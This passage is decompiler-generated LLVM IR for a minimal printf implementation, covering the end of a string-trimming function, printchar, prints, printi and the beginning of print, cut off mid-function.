  %v2_8048314 = load i8, i8* %v1_8048314, align 1
  %v2_8048316 = sext i8 %v2_8048314 to i32
  %v1_804831d = call i32 @isspace(i32 %v2_8048316)
  %v1_8048325 = icmp eq i32 %v1_804831d, 0
  %v1_8048327 = icmp eq i1 %v1_8048325, false
  br i1 %v1_8048327, label %dec_label_pc_8048303, label %dec_label_pc_8048329

dec_label_pc_8048329:                             ; preds = %dec_label_pc_8048303, %dec_label_pc_804830e, %dec_label_pc_8048306.preheader
  %stack_var_-12.0.in.lcssa = phi i32 [ %v1_80482dd, %dec_label_pc_8048306.preheader ], [ %stack_var_-12.0.in25, %dec_label_pc_804830e ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v7_804835118 = icmp sgt i32 %stack_var_-16.0, %stack_var_-12.0.in.lcssa
  br i1 %v7_804835118, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048331:                             ; preds = %dec_label_pc_8048329, %dec_label_pc_8048331
  %v6_804835b20 = phi i32 [ %v6_804835b, %dec_label_pc_8048331 ], [ %v4_80482c5, %dec_label_pc_8048329 ]
  %storemerge.in19 = phi i32 [ %v5_8048348, %dec_label_pc_8048331 ], [ %stack_var_-16.0, %dec_label_pc_8048329 ]
  %v6_8048341 = add i32 %storemerge.in19, %v4_80482c5
  %v1_8048344 = inttoptr i32 %v6_8048341 to i8*
  %v2_8048344 = load i8, i8* %v1_8048344, align 1
  %v3_8048346 = inttoptr i32 %v6_804835b20 to i8*
  store i8 %v2_8048344, i8* %v3_8048346, align 1
  %v5_8048348 = add i32 %storemerge.in19, 1
  %v7_8048351 = icmp sgt i32 %v5_8048348, %stack_var_-12.0.in.lcssa
  %v2_8048359 = sub i32 %v5_8048348, %stack_var_-16.0
  %v6_804835b = add i32 %v2_8048359, %v4_80482c5
  br i1 %v7_8048351, label %dec_label_pc_8048353, label %dec_label_pc_8048331

dec_label_pc_8048353:                             ; preds = %dec_label_pc_8048331, %dec_label_pc_8048329
  %v6_804835b.lcssa = phi i32 [ %v4_80482c5, %dec_label_pc_8048329 ], [ %v6_804835b, %dec_label_pc_8048331 ]
  %v22_804835b = inttoptr i32 %v6_804835b.lcssa to i8*
  store i8 0, i8* %v22_804835b, align 1
  %v3_8048361 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048361, i32* @edi, align 4
  ret i32 %v6_804835b.lcssa

; uselistorder directives
  uselistorder i32 %v6_804835b.lcssa, { 1, 0 }
  uselistorder i32 %v5_8048348, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.in.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.in25, { 0, 2, 1 }
  uselistorder i32 %v5_8048303, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v1_80482dd, { 2, 1, 0 }
  uselistorder i32 %v4_80482c5, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %tmp10, { 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder label %dec_label_pc_8048331, { 1, 0 }
  uselistorder label %dec_label_pc_8048329, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830e, { 1, 0 }
  uselistorder label %dec_label_pc_80482e6, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_804839e

dec_label_pc_804838b:                             ; preds = %entry
  %v3_8048396 = bitcast i8* %stack_var_8 to i32*
  %v4_8048396 = call i32 @__libc_write(i32 1, i32* %v3_8048396, i32 1)
  br label %dec_label_pc_804839e

dec_label_pc_804839e:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_804839f = phi i32 [ %tmp3, %dec_label_pc_8048372 ], [ %v4_8048396, %dec_label_pc_804838b ]
  ret i32 %v0_804839f

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804839e, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp25 = icmp slt i32 %arg3, 1
  br i1 %tmp25, label %dec_label_pc_8048400, label %dec_label_pc_80483ba

dec_label_pc_80483ba:                             ; preds = %entry
  %v4_80483c1 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c1, i32* @edx, align 4
  %v2_80483d256 = load i8, i8* %arg2, align 1
  %v3_80483d257 = zext i8 %v2_80483d256 to i32
  %v5_80483d258 = and i32 %v4_80483c1, -256
  %v6_80483d259 = or i32 %v3_80483d257, %v5_80483d258
  %v4_80483d460 = icmp eq i8 %v2_80483d256, 0
  %v1_80483d661 = icmp eq i1 %v4_80483d460, false
  br i1 %v1_80483d661, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483c9:                             ; preds = %dec_label_pc_80483ba, %dec_label_pc_80483c9
  %v6_80483d264 = phi i32 [ %v6_80483d2, %dec_label_pc_80483c9 ], [ %v6_80483d259, %dec_label_pc_80483ba ]
  %v4_80483cf63 = phi i32 [ %v5_80483cc, %dec_label_pc_80483c9 ], [ %v4_80483c1, %dec_label_pc_80483ba ]
  %stack_var_-12.062 = phi i32 [ %v4_80483c9, %dec_label_pc_80483c9 ], [ 0, %dec_label_pc_80483ba ]
  %v4_80483c9 = add i32 %stack_var_-12.062, 1
  %v5_80483cc = add i32 %v4_80483cf63, 1
  %v22_80483cc = inttoptr i32 %v5_80483cc to i8*
  store i32 %v5_80483cc, i32* @edx, align 4
  %v2_80483d2 = load i8, i8* %v22_80483cc, align 1
  %v3_80483d2 = zext i8 %v2_80483d2 to i32
  %v5_80483d2 = and i32 %v6_80483d264, -256
  %v6_80483d2 = or i32 %v3_80483d2, %v5_80483d2
  %v4_80483d4 = icmp eq i8 %v2_80483d2, 0
  %v1_80483d6 = icmp eq i1 %v4_80483d4, false
  br i1 %v1_80483d6, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483d8:                             ; preds = %dec_label_pc_80483c9, %dec_label_pc_80483ba
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483ba ], [ %v4_80483c9, %dec_label_pc_80483c9 ]
  %v5_80483de = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483de, label %dec_label_pc_80483e9, label %dec_label_pc_80483ef

dec_label_pc_80483e9:                             ; preds = %dec_label_pc_80483d8
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483ec = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483ef

dec_label_pc_80483ef:                             ; preds = %dec_label_pc_80483d8, %dec_label_pc_80483e9
  %storemerge = phi i32 [ %v5_80483ec, %dec_label_pc_80483e9 ], [ 0, %dec_label_pc_80483d8 ]
  %v1_80483f2 = and i32 %arg4, 2
  %tmp26 = mul nuw nsw i32 %v1_80483f2, 8
  %tmp27 = or i32 %tmp26, 32
  br label %dec_label_pc_8048400

dec_label_pc_8048400:                             ; preds = %dec_label_pc_80483ef, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483ef ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp27, %dec_label_pc_80483ef ]
  %v1_8048403 = urem i32 %arg4, 2
  %v2_8048403 = icmp eq i32 %v1_8048403, 0
  %v1_8048408 = icmp eq i1 %v2_8048403, false
  %.pre11 = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048408, label %dec_label_pc_804844a.preheader, label %dec_label_pc_8048423.preheader

dec_label_pc_8048423.preheader:                   ; preds = %dec_label_pc_8048400
  %tmp2849 = icmp slt i32 %stack_var_12.0, 1
  %tmp2950 = icmp eq i1 %tmp2849, false
  br i1 %tmp2950, label %dec_label_pc_804840c.lr.ph, label %dec_label_pc_804844a.preheader

dec_label_pc_804840c.lr.ph:                       ; preds = %dec_label_pc_8048423.preheader
  br label %dec_label_pc_804840c

dec_label_pc_804840c:                             ; preds = %dec_label_pc_804840c.lr.ph, %dec_label_pc_804840c
  %stack_var_-20.052 = phi i32 [ 0, %dec_label_pc_804840c.lr.ph ], [ %v4_804841d, %dec_label_pc_804840c ]
  %stack_var_12.151 = phi i32 [ %stack_var_12.0, %dec_label_pc_804840c.lr.ph ], [ %v4_8048420, %dec_label_pc_804840c ]
  %v3_8048415 = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_804841d = add i32 %stack_var_-20.052, 1
  %v4_8048420 = add i32 %stack_var_12.151, -1
  %tmp28 = icmp slt i32 %v4_8048420, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_804840c, label %dec_label_pc_804844a.preheader

dec_label_pc_804844a.preheader:                   ; preds = %dec_label_pc_8048423.preheader, %dec_label_pc_804840c, %dec_label_pc_8048400
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048400 ], [ %stack_var_12.0, %dec_label_pc_8048423.preheader ], [ %v4_8048420, %dec_label_pc_804840c ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048400 ], [ 0, %dec_label_pc_8048423.preheader ], [ %v4_804841d, %dec_label_pc_804840c ]
  %v2_804844d38 = load i8, i8* %arg2, align 1
  %v4_804844f42 = icmp eq i8 %v2_804844d38, 0
  %v1_804845143 = icmp eq i1 %v4_804844f42, false
  br i1 %v1_804845143, label %dec_label_pc_804842b.lr.ph, label %dec_label_pc_804846c.preheader

dec_label_pc_804842b.lr.ph:                       ; preds = %dec_label_pc_804844a.preheader
  %v4_804844a37 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_804842b

dec_label_pc_804842b:                             ; preds = %dec_label_pc_804842b.lr.ph, %dec_label_pc_804842b
  %v4_804844a46 = phi i32 [ %v4_804844a37, %dec_label_pc_804842b.lr.ph ], [ %v5_8048447, %dec_label_pc_804842b ]
  %stack_var_-20.145 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804842b.lr.ph ], [ %v4_8048444, %dec_label_pc_804842b ]
  %stack_var_8.044 = phi i8* [ %arg2, %dec_label_pc_804842b.lr.ph ], [ %v22_8048447, %dec_label_pc_804842b ]
  %v2_804842e = load i8, i8* %stack_var_8.044, align 1
  %v3_804842e = zext i8 %v2_804842e to i32
  %v3_804843c = call i32 @printchar(i32* %.pre11, i32 %v3_804842e)
  %v4_8048444 = add i32 %stack_var_-20.145, 1
  %v5_8048447 = add i32 %v4_804844a46, 1
  %v22_8048447 = inttoptr i32 %v5_8048447 to i8*
  %v2_804844d = load i8, i8* %v22_8048447, align 1
  %v4_804844f = icmp eq i8 %v2_804844d, 0
  %v1_8048451 = icmp eq i1 %v4_804844f, false
  br i1 %v1_8048451, label %dec_label_pc_804842b, label %dec_label_pc_804846c.preheader

dec_label_pc_804846c.preheader:                   ; preds = %dec_label_pc_804842b, %dec_label_pc_804844a.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804844a.preheader ], [ %v4_8048444, %dec_label_pc_804842b ]
  %tmp3033 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp3134 = icmp eq i1 %tmp3033, false
  br i1 %tmp3134, label %dec_label_pc_8048455.lr.ph, label %dec_label_pc_8048472

dec_label_pc_8048455.lr.ph:                       ; preds = %dec_label_pc_804846c.preheader
  br label %dec_label_pc_8048455

dec_label_pc_8048455:                             ; preds = %dec_label_pc_8048455.lr.ph, %dec_label_pc_8048455
  %stack_var_-20.236 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048455.lr.ph ], [ %v4_8048466, %dec_label_pc_8048455 ]
  %stack_var_12.335 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_8048455.lr.ph ], [ %v4_8048469, %dec_label_pc_8048455 ]
  %v3_804845e = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_8048466 = add i32 %stack_var_-20.236, 1
  %v4_8048469 = add i32 %stack_var_12.335, -1
  %tmp30 = icmp slt i32 %v4_8048469, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_8048455, label %dec_label_pc_8048472

dec_label_pc_8048472:                             ; preds = %dec_label_pc_8048455, %dec_label_pc_804846c.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804846c.preheader ], [ %v4_8048466, %dec_label_pc_8048455 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048447, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483cc, { 1, 2, 0 }
  uselistorder i32 %v4_80483c1, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_8048455, { 1, 0 }
  uselistorder label %dec_label_pc_804842b, { 1, 0 }
  uselistorder label %dec_label_pc_804844a.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804840c, { 1, 0 }
  uselistorder label %dec_label_pc_80483ef, { 1, 0 }
  uselistorder label %dec_label_pc_80483c9, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_804848e = sext i32 %tmp35 to i64
  %v4_8048491 = icmp eq i32 %tmp35, 0
  %v5_8048491 = icmp slt i32 %tmp35, 0
  %v1_8048495 = icmp eq i1 %v4_8048491, false
  br i1 %v1_8048495, label %dec_label_pc_80484bc, label %dec_label_pc_8048497

dec_label_pc_8048497:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484ac = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_8048597

dec_label_pc_80484bc:                             ; preds = %entry
  %v4_80484bc = icmp eq i32 %tmp28, 0
  br i1 %v4_80484bc, label %dec_label_pc_80484dd, label %dec_label_pc_80484c2

dec_label_pc_80484c2:                             ; preds = %dec_label_pc_80484bc
  %v12_80484c2 = icmp eq i32 %tmp27, 10
  %v1_80484c6 = icmp eq i1 %v12_80484c2, false
  br i1 %v1_80484c6, label %dec_label_pc_80484dd, label %dec_label_pc_80484c8

dec_label_pc_80484c8:                             ; preds = %dec_label_pc_80484c2
  %v1_80484cc = icmp eq i1 %v5_8048491, false
  br i1 %v1_80484cc, label %dec_label_pc_80484dd, label %dec_label_pc_80484ce

dec_label_pc_80484ce:                             ; preds = %dec_label_pc_80484c8
  %v1_80484d8 = sub i32 0, %tmp35
  %v5_80484da = sext i32 %v1_80484d8 to i64
  br label %dec_label_pc_80484dd

dec_label_pc_80484dd:                             ; preds = %dec_label_pc_80484c8, %dec_label_pc_80484c2, %dec_label_pc_80484bc, %dec_label_pc_80484ce
  %stack_var_-24.0 = phi i64 [ %v5_804848e, %dec_label_pc_80484bc ], [ %v5_804848e, %dec_label_pc_80484c2 ], [ %v5_804848e, %dec_label_pc_80484c8 ], [ %v5_80484da, %dec_label_pc_80484ce ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484bc ], [ 0, %dec_label_pc_80484c2 ], [ 0, %dec_label_pc_80484c8 ], [ 1, %dec_label_pc_80484ce ]
  %v15_80484e0 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_804853e7 = trunc i64 %stack_var_-24.0 to i32
  %v5_804853e8 = icmp eq i32 %v4_804853e7, 0
  %v1_804854215 = icmp eq i1 %v5_804853e8, false
  br i1 %v1_804854215, label %dec_label_pc_80484ee.lr.ph, label %dec_label_pc_8048544

dec_label_pc_80484ee.lr.ph:                       ; preds = %dec_label_pc_80484dd
  %v5_80484f1 = sext i32 %tmp27 to i64
  br label %dec_label_pc_80484ee

dec_label_pc_80484ee:                             ; preds = %dec_label_pc_80484ee.lr.ph, %dec_label_pc_8048516
  %v3_804851618 = phi i8* [ %tmp48, %dec_label_pc_80484ee.lr.ph ], [ %v22_8048516, %dec_label_pc_8048516 ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_80484ee.lr.ph ], [ %v5_804853b, %dec_label_pc_8048516 ]
  %v6_80484fc = and i64 %stack_var_-24.116, 4294967295
  %v12_80484fc = udiv i64 %v6_80484fc, %v5_80484f1
  %v13_80484fc = trunc i64 %v12_80484fc to i32
  %v14_80484fc = urem i64 %v6_80484fc, %v5_80484f1
  %v5_8048501 = trunc i64 %v14_80484fc to i8
  %v7_8048508 = icmp sgt i8 %v5_8048501, 9
  br i1 %v7_8048508, label %dec_label_pc_804850a, label %dec_label_pc_8048516

dec_label_pc_804850a:                             ; preds = %dec_label_pc_80484ee
  %tmp52 = trunc i64 %v14_80484fc to i32
  %v5_804850d = add i32 %tmp52, %tmp
  %v1_8048510 = add i32 %v5_804850d, 198
  %v11_8048510 = trunc i32 %v1_8048510 to i8
  br label %dec_label_pc_8048516

dec_label_pc_8048516:                             ; preds = %dec_label_pc_80484ee, %dec_label_pc_804850a
  %stack_var_-36.0 = phi i8 [ %v11_8048510, %dec_label_pc_804850a ], [ %v5_8048501, %dec_label_pc_80484ee ]
  %v4_8048516 = ptrtoint i8* %v3_804851618 to i32
  %v5_8048516 = add i32 %v4_8048516, -1
  %v22_8048516 = inttoptr i32 %v5_8048516 to i8*
  %v1_804851c = add i8 %stack_var_-36.0, 48
  store i8 %v1_804851c, i8* %v22_8048516, align 1
  %v5_804853b = sext i32 %v13_80484fc to i64
  %v5_804853e = icmp eq i32 %v13_80484fc, 0
  %v1_8048542 = icmp eq i1 %v5_804853e, false
  br i1 %v1_8048542, label %dec_label_pc_80484ee, label %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge

dec_label_pc_804853e.dec_label_pc_8048544_crit_edge: ; preds = %dec_label_pc_8048516
  store i8* %v22_8048516, i8** %stack_var_-40, align 4
  br label %dec_label_pc_8048544

dec_label_pc_8048544:                             ; preds = %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge, %dec_label_pc_80484dd
  %v3_8048581622 = phi i32 [ %v5_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %v15_80484e0, %dec_label_pc_80484dd ]
  %v3_8048572 = phi i8* [ %v22_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %tmp48, %dec_label_pc_80484dd ]
  %v4_8048544 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_8048544, label %dec_label_pc_804857b, label %dec_label_pc_804854a

dec_label_pc_804854a:                             ; preds = %dec_label_pc_8048544
  %v4_804854a = icmp eq i32 %tmp31, 0
  br i1 %v4_804854a, label %dec_label_pc_8048572, label %dec_label_pc_8048550

dec_label_pc_8048550:                             ; preds = %dec_label_pc_804854a
  %v1_8048553 = and i32 %tmp32, 2
  %v2_8048553 = icmp eq i32 %v1_8048553, 0
  br i1 %v2_8048553, label %dec_label_pc_8048572, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_8048550
  %v3_8048562 = inttoptr i32 %arg1 to i32*
  %v4_8048562 = call i32 @printchar(i32* %v3_8048562, i32 45)
  %v4_804856d = add i32 %tmp31, -1
  br label %dec_label_pc_804857b

dec_label_pc_8048572:                             ; preds = %dec_label_pc_8048550, %dec_label_pc_804854a
  %v4_8048572 = ptrtoint i8* %v3_8048572 to i32
  %v5_8048572 = add i32 %v4_8048572, -1
  %v22_8048572 = inttoptr i32 %v5_8048572 to i8*
  store i8* %v22_8048572, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_8048572, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80485816.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804857b

dec_label_pc_804857b:                             ; preds = %dec_label_pc_8048544, %dec_label_pc_804855a, %dec_label_pc_8048572
  %v3_80485816 = phi i32 [ %v3_8048581622, %dec_label_pc_8048544 ], [ %v3_80485816.pre, %dec_label_pc_8048572 ], [ %v3_8048581622, %dec_label_pc_804855a ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_8048544 ], [ %tmp31, %dec_label_pc_8048572 ], [ %v4_804856d, %dec_label_pc_804855a ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048544 ], [ 0, %dec_label_pc_8048572 ], [ 1, %dec_label_pc_804855a ]
  %v1_8048587.cast = inttoptr i32 %v3_80485816 to i8*
  %v6_8048587 = call i32 @prints(i32 %arg1, i8* %v1_8048587.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_8048592 = add i32 %v6_8048587, %stack_var_-28.0
  store i32 %v2_8048592, i32* @edx, align 4
  br label %dec_label_pc_8048597

dec_label_pc_8048597:                             ; preds = %dec_label_pc_8048497, %dec_label_pc_804857b
  %storemerge = phi i32 [ %v2_8048592, %dec_label_pc_804857b ], [ %v6_80484ac, %dec_label_pc_8048497 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_8048516, { 0, 1, 3, 2 }
  uselistorder i8 %v5_8048501, { 1, 0 }
  uselistorder i64 %v6_80484fc, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048597, { 1, 0 }
  uselistorder label %dec_label_pc_804857b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048516, { 1, 0 }
  uselistorder label %dec_label_pc_80484ee, { 1, 0 }
  uselistorder label %dec_label_pc_80484dd, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804859c = load i32, i32* @ebp, align 4
  store i32 %v0_804859c, i32* %stack_var_-4, align 4
  %v15_804859f = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048791 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.444 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80487c745 = load i8, i8* %stack_var_8.444, align 1
  %v3_80487c746 = zext i8 %v2_80487c745 to i32
  %v5_80487c747 = and i32 %arg2, -256
  %v6_80487c748 = or i32 %v3_80487c746, %v5_80487c747
  store i32 %v6_80487c748, i32* %eax.global-to-local, align 4
  %v4_80487c949 = icmp eq i8 %v2_80487c745, 0
  %v1_80487cb50 = icmp eq i1 %v4_80487c949, false
  br i1 %v1_80487cb50, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80485ae:                             ; preds = %entry, %dec_label_pc_80487c1
  %v0_80487af = phi i32 [ %v4_804867366, %dec_label_pc_80487c1 ], [ %v15_804859f, %entry ]
  %v5_80487c756 = phi i32 [ %v5_80487c7, %dec_label_pc_80487c1 ], [ %v5_80487c747, %entry ]
  %stack_var_8.455 = phi i8* [ %stack_var_8.4, %dec_label_pc_80487c1 ], [ %stack_var_8.444, %entry ]
  %stack_var_-28.154 = phi i32 [ %stack_var_-28.0, %dec_label_pc_80487c1 ], [ 0, %entry ]
  %stack_var_8.4.in53 = phi i32 [ %v5_80487c1, %dec_label_pc_80487c1 ], [ %arg2, %entry ]
  %stack_var_12.152 = phi i32 [ %stack_var_12.0, %dec_label_pc_80487c1 ], [ %arg3, %entry ]
  %stack_var_-24.151 = phi i32 [ %stack_var_-24.0, %dec_label_pc_80487c1 ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in53, i32* %eax.global-to-local, align 4
  %v2_80485b1 = load i8, i8* %stack_var_8.455, align 1
  %v3_80485b1 = zext i8 %v2_80485b1 to i32
  %v6_80485b1 = or i32 %v3_80485b1, %v5_80487c756
  store i32 %v6_80485b1, i32* %eax.global-to-local, align 4
  %v10_80485b3 = icmp eq i8 %v2_80485b1, 37
  %v1_80485b5 = icmp eq i1 %v10_80485b3, false
  br i1 %v1_80485b5, label %dec_label_pc_80487a5, label %dec_label_pc_80485bb

dec_label_pc_80485bb:                             ; preds = %dec_label_pc_80485ae
  %v5_80485bb = add i32 %stack_var_8.4.in53, 1
  %v22_80485bb = inttoptr i32 %v5_80485bb to i8*
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485ce = load i8, i8* %v22_80485bb, align 1
  %v3_80485ce = zext i8 %v2_80485ce to i32
  %v5_80485ce = and i32 %v5_80485bb, -256
  %v6_80485ce = or i32 %v3_80485ce, %v5_80485ce
  store i32 %v6_80485ce, i32* %eax.global-to-local, align 4
  %v4_80485d0 = icmp eq i8 %v2_80485ce, 0
  br i1 %v4_80485d0, label %dec_label_pc_80487d1, label %dec_label_pc_80485d8

dec_label_pc_80485d8:                             ; preds = %dec_label_pc_80485bb
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485db = load i8, i8* %v22_80485bb, align 1
  %v3_80485db = zext i8 %v2_80485db to i32
  %v6_80485db = or i32 %v3_80485db, %v5_80485ce
  store i32 %v6_80485db, i32* %eax.global-to-local, align 4
  %v10_80485dd = icmp eq i8 %v2_80485db, 37
  br i1 %v10_80485dd, label %dec_label_pc_80487a5, label %dec_label_pc_80485e5

dec_label_pc_80485e5:                             ; preds = %dec_label_pc_80485d8
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485e8 = load i8, i8* %v22_80485bb, align 1
  %v3_80485e8 = zext i8 %v2_80485e8 to i32
  %v6_80485e8 = or i32 %v3_80485e8, %v5_80485ce
  store i32 %v6_80485e8, i32* %eax.global-to-local, align 4
  %v10_80485ea = icmp eq i8 %v2_80485e8, 45
  %v1_80485ec = icmp eq i1 %v10_80485ea, false
  br i1 %v1_80485ec, label %dec_label_pc_8048601.preheader, label %dec_label_pc_80485ee

dec_label_pc_80485ee:                             ; preds = %dec_label_pc_80485e5
  %v5_80485ee = add i32 %stack_var_8.4.in53, 2
  %v22_80485ee = inttoptr i32 %v5_80485ee to i8*
  br label %dec_label_pc_8048601.preheader

dec_label_pc_8048601.preheader:                   ; preds = %dec_label_pc_80485ee, %dec_label_pc_80485e5
  %stack_var_8.0.ph = phi i8* [ %v22_80485bb, %dec_label_pc_80485e5 ], [ %v22_80485ee, %dec_label_pc_80485ee ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_80485e5 ], [ 1, %dec_label_pc_80485ee ]
  %v4_804860115 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804860115, i32* %eax.global-to-local, align 4
  %v2_804860416 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804860417 = zext i8 %v2_804860416 to i32
  %v5_804860418 = and i32 %v4_804860115, -256
  %v6_804860419 = or i32 %v3_804860417, %v5_804860418
  store i32 %v6_804860419, i32* %eax.global-to-local, align 4
  %v7_804860621 = icmp eq i8 %v2_804860416, 48
  br i1 %v7_804860621, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_80485fa:                             ; preds = %dec_label_pc_8048601.preheader, %dec_label_pc_80485fa
  %v4_804860123 = phi i32 [ %v5_80485fa, %dec_label_pc_80485fa ], [ %v4_804860115, %dec_label_pc_8048601.preheader ]
  %stack_var_-32.022 = phi i32 [ %v4_80485fd, %dec_label_pc_80485fa ], [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ]
  %v5_80485fa = add i32 %v4_804860123, 1
  %v22_80485fa = inttoptr i32 %v5_80485fa to i8*
  %v4_80485fd = or i32 %stack_var_-32.022, 2
  store i32 %v5_80485fa, i32* %eax.global-to-local, align 4
  %v2_8048604 = load i8, i8* %v22_80485fa, align 1
  %v3_8048604 = zext i8 %v2_8048604 to i32
  %v5_8048604 = and i32 %v5_80485fa, -256
  %v6_8048604 = or i32 %v3_8048604, %v5_8048604
